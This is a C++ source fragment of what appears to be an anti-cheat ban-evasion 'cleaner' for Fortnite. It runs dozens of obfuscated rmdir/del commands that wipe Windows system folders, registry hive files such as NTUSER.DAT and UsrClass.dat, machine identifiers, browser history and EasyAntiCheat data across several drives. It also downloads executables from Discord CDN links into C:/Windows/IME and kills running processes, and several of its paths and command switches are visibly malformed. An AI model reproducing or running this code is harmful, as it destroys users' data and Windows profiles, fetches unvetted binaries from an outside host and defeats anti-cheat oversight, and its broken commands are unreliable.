	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat").c_str());
	system(_xor_("del /f /s /q D:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache").c_str());
	system(_xor_("del /f /s /q D:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History").c_str());
	system(_xor_("rmdir /s /q D:\\Users\\%username%\\Intel").c_str());
	system(_xor_("rmdir /s /q D:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData").c_str());
	system(_xor_("rmdir /s /q ""\"\D:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache").c_str());
}
void wipe_e() {
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\INF").c_str());
	system(_xor_("rmdir /s /q E:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\Public\\Documents").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\CrashReportClient").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\temp").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q E:\\ProgramData\\Microsoft\\Windows\\WER\\Temp").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\Prefetch").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q E:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat").c_str());
	system(_xor_("del /f /s /q E:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache").c_str());
	system(_xor_("del /f /s /q E:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History").c_str());
	system(_xor_("rmdir /s /q E:\\Users\\%username%\\Intel").c_str());
	system(_xor_("rmdir /s /q E:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData").c_str());
	system(_xor_("rmdir /s /q ""\"\E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache").c_str());
}
void wipe_f() {
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\INF").c_str());
	system(_xor_("rmdir /s /q F:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\Public\\Documents").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\Prefetch").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\D3DSCache").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\CrashReportClient").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\temp").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\SoftwareDistribution\\DataStore\\Logs").c_str());
	system(_xor_("rmdir /s /q F:\\ProgramData\\Microsoft\\Windows\\WER\\Temp").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\Prefetch").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q F:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*").c_str());
	system(_xor_("@del /s /f /a:h / a : a / q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat").c_str());
	system(_xor_("del /f /s /q F:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache").c_str());
	system(_xor_("del /f /s /q F:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Temp").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History").c_str());
	system(_xor_("rmdir /s /q F:\\Users\\%username%\\Intel").c_str());
	system(_xor_("rmdir /s /q F:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData").c_str());
	system(_xor_("rmdir /s /q ""\"\F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache").c_str());

}


int clean() {
	char answ3r;
	int num;
	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 11);

	HideConsole();
	system("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp");
	system("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat");
	CConsole::Clear();
	ShowConsole();


	HideConsole();

	HRESULT hx = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/548991810274459651/624013480965570570/devcon.exe"), _T("C:/Windows/IME/devcon.exe"), 0, NULL);
	HRESULT hz = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/548991810274459651/640271146368892939/adapters.exe"), _T("C:/Windows/IME/adapters.exe"), 0, NULL);
	HRESULT hr = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/548991810274459651/658643393215201292/network.exe"), _T("C:/Windows/IME/network.exe"), 0, NULL);
	HRESULT hr2 = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/687722315118936111/692475040318619729/mac.exe"), _T("C:/Windows/IME/mac.exe"), 0, NULL);


	system("taskkill /f /im EpicGamesLauncher.exe");
	system("taskkill /f /im FortniteClient-Win64-Shipping.exe");
	system("taskkill /f /im OneDrive.exe");

	clean_anticheat();

	if (regedit() == TRUE)

		CConsole::Clear();
	ShowConsole();
	cout << " " << endl;
	cout << "[+] Searching for tracking files..." << endl;

	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str());

	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini:NTV)").c_str()) != 0)
		//cout << "Deleted C:\\Users\\Gaypple\\ntuser.ini:NTV" << endl;
		DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());

	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW(L"C:\\Windows\\System32\\catroot2\\dberr.txt");

	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat)").c_str()) != 0)
		//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat" << endl;
		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(AppData\Local\Microsoft\Windows\UsrClass.dat)").c_str()) != 0)
			//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat" << endl;
			if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\usrclass.dat)").c_str()) != 0)
				//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\usrclass.dat" << endl;
				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(AppData\Local\Microsoft\Windows\usrclass.dat)").c_str()) != 0)
					//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\usrclass.dat" << endl;
					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Vault\UserProfileRoaming\Latest.dat)").c_str()) != 0)
						//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat" << endl;

						if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.log1)").c_str()) != 0)
							//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.log1" << endl;

							if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG2)").c_str()) != 0)
								//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat" << endl;

								if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.log2.LOG2)").c_str()) != 0)
									//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.log2" << endl;

									if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.log2)").c_str()) != 0)
										//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat.log2" << endl;

										if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
											//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\LMS\\Manifest.sav" << endl;

											if (DeleteFileW(L"C:\\Users\\Public\\Libraries\\collection.dat") != 0)
												//cout << "Deleted C:\\Users\\Public\\Libraries\\collection.dat" << endl;

												if (DeleteFileW(L"C:$Secure:$SDH:$INDEX_ALLOCATION") != 0)
													//cout << "Deleted C:$Secure:$SDH:$INDEX_ALLOCATION" << endl;
													if (DeleteFileW(L"C:\$Secure:\$SDH:\$INDEX_ALLOCATION") != 0)
														//cout << "Deleted C:$Secure:$SDH:$INDEX_ALLOCATION" << endl;

														if (DeleteFileW(L"C:\\Users\\Public\\Shared Files:VersionCache") != 0)
															//cout << "Deleted C:\\Users\\Public\\Shared Files:VersionCache" << endl;


															if (DeleteFileW(L"C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
																//cout << "Deleted C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat" << endl;

																if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\04f992c.tmp)").c_str()) != 0)
																	//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Temp\\04f992c.tmp" << endl;

																	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str());


	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
		//cout << "Deleted C:\\Users\\Gaypple\\Videos\\Captures\\desktop.ini" << endl;

		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
			//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Feeds:KnownSources" << endl;
			DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds:KnownSources)").c_str());


	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
		//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Feeds:KnownSources" << endl;
		DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds:KnownSources)").c_str());


	if (DeleteFileW(L"C:\\desktop.ini:CachedTiles") != 0)
		//cout << "Deleted C:\\desktop.ini:CachedTiles" << endl;


		if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Config\\NoRedist\\Windows\\ShippableWindowsGameUserSettings.ini") != 0)
			//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Config\\NoRedist\\Windows\\ShippableWindowsGameUserSettings.ini" << endl;

			if (DeleteFileW(L"C:\\Recovery\\ntuser.sys") != 0)
				//cout << "Deleted C:\\Recovery\\ntuser.sys" << endl;





				DeleteFileW(L"C:\\desktop.ini");



	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat" << endl;


		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Packages\\Settings\\settings.dat" << endl;


			if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)

				//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini" << endl;


				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Config\\WindowsClient\\GameUserSettings.ini" << endl;



					if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json" << endl;


						if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\ClientSettings.Sav)").c_str()) != 0)
							//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\ClientSettings.Sav" << endl;



							if (DeleteFileW(L"C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								//cout << "Deleted C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat" << endl;


								if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini" << endl;


									if (DeleteFileW(L"C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										//cout << "Deleted C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\ActivationStore.dat" << endl;



										if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Logs\\FortniteGame.log" << endl;

											if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.IE5" << endl;

												if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\History.IE5" << endl;

													if (DeleteFileW(L"C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx") != 0)
														//cout << "Deleted C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx" << endl;


														if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log)").c_str()) != 0)
															//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log" << endl;

															if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log)").c_str()) != 0)
																//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log" << endl;

																if (DeleteFileW(L"C:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2") != 0)
																	//cout << "Deleted C:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2" << endl;

																	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																		//cout << "Deleted C:\\Users\\Gaypple\\ntuser.ini" << endl;
																		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																			//cout << "Deleted C:\\Users\\Gaypple\\ntuser.pol" << endl;


																			if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG1)").c_str()) != 0)
																				//cout << "Deleted C:\\Users\\Gaypple\\ntuser.dat.LOG1" << endl;
																				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG2)").c_str()) != 0)
																					//cout << "Deleted C:\\Users\\Gaypple\\ntuser.dat.LOG2" << endl;

																					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat)").c_str()) != 0)
																						//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat" << endl;

																						if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
																							//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache" << endl;
																							DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files");

	if (DeleteFileW(L"C:\\Users\\Public\\Documents") != 0)
		//cout << "Deleted C:\\Users\\Public\\Documents" << endl;

		if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
			//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin" << endl;

			if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
				//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\CurveEditorTools\\AssetRegistry.bin" << endl;

				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
					//cout << "Deleted C:\\Users\\Gaypple\\Documents\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
						//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\Unreal Engine\\Engine\\Config\\UserGameUserSettings.ini" << endl;

						if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
							//cout << "Deleted C:\\Users\\Gaypple\\AppData\\Local\\FortniteGame\\Saved\\Cloud\\ClientSettings.Sav" << endl;

							if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav") != 0)
								//cout << "Deleted C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav" << endl;
								DeleteFileW(L"C:\\Users\\Public\\Shared Files");

	if (DeleteFileW(L"C:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
		//cout << "Deleted C:\\Windows\\System32\\restore\\MachineGuid.txt" << endl;

		if (DeleteFileW(L"C:\\System Volume Information\\tracking.log") != 0)
			//cout << "Deleted C:\\System Volume Information\\tracking.log" << endl;

			if (DeleteFileW(L"C:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
				//cout << "Deleted C:\\Windows\\System32\\restore\\MachineGuid.txt" << endl;

				if (DeleteFileW(L"C:\\System Volume Information\\WPSettings.dat") != 0)
					//cout << "Deleted C:\\System Volume Information\\WPSettings.dat" << endl;

					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\NTUSER.DAT)").c_str()) != 0)
						//cout << "Deleted C:\\Users\\Gaypple\\NTUSER.DAT" << endl;

						if (DeleteFileW(L"C:\\ProgramData\\ntuser.pol") != 0)
							//cout << "Deleted C:\\ProgramData\\ntuser.pol" << endl;

							if (DeleteFileW(L"C:\\PerfLogs\\collection.dat") != 0)
								//cout << "Deleted C:\\PerfLogs\\collection.dat" << endl;

								if (DeleteFileW(L"C:\\Drivers\\storage.cache") != 0)
									//cout << "Deleted C:\\Drivers\\storage.cache" << endl;

									if (DeleteFileW(L"C:\\Intel\\setup.cache") != 0)
										//cout << "Deleted C:\\Intel\\setup.cache" << endl;

										if (DeleteFileW(L"C:\\MSOCache\\Setup.dat") != 0)
											//cout << "Deleted C:\\MSOCache\\Setup.dat" << endl;

											DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files");
	DeleteFileW(L"E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files");
	DeleteFileW(L"F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files");
	DeleteFileW(L"E:\\Users\\Public\\Shared Files");
	DeleteFileW(L"F:\\Users\\Public\\Shared Files");


	//Disk D:

	if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str()) != 0)
		//cout << "Deleted D:\\Users\\Gaypple\\AppData\\Local\\Microsoft\\Windows\\History\\desktop.ini" << endl;

